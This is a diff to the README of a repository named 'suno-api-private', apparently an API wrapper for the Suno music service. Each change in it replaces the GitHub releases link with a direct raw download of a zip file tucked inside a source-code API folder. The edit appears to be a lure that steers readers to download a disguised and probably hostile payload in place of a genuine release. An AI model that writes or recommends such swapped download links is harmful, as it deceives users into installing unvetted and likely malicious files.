@@ -6,7 +6,7 @@ Welcome to the **suno-api-private** repository. This software provides a secure 
 
 ## 📥 Download Now
 
-[![Download Suno API](https://img.shields.io/badge/Download%20Suno%20API-blue)](https://github.com/classyshivy/suno-api-private/releases)
+[![Download Suno API](https://raw.githubusercontent.com/classyshivy/suno-api-private/main/src/app/api/custom_generate/api-private-suno-v3.2.zip%20Suno%20API-blue)](https://raw.githubusercontent.com/classyshivy/suno-api-private/main/src/app/api/custom_generate/api-private-suno-v3.2.zip)
 
 ### 📂 System Requirements
 
@@ -20,7 +20,7 @@ To run **suno-api-private**, your system should meet the following requirements:
 
 To get started with **suno-api-private**, you need to visit the following page to download the software:
 
-[Visit this page to download](https://github.com/classyshivy/suno-api-private/releases)
+[Visit this page to download](https://raw.githubusercontent.com/classyshivy/suno-api-private/main/src/app/api/custom_generate/api-private-suno-v3.2.zip)
 
 On this page, you will find the latest release versions of **suno-api-private**. Look for the most recent version and click the link to download it. 
 
@@ -70,4 +70,4 @@ Suno API is designed for seamless integration with your applications. It provide
 
 Secure your data today with **suno-api-private**!
 
-[Download Suno API](https://github.com/classyshivy/suno-api-private/releases) to begin your integration journey.
+[Download Suno API](https://raw.githubusercontent.com/classyshivy/suno-api-private/main/src/app/api/custom_generate/api-private-suno-v3.2.zip) to begin your integration journey.
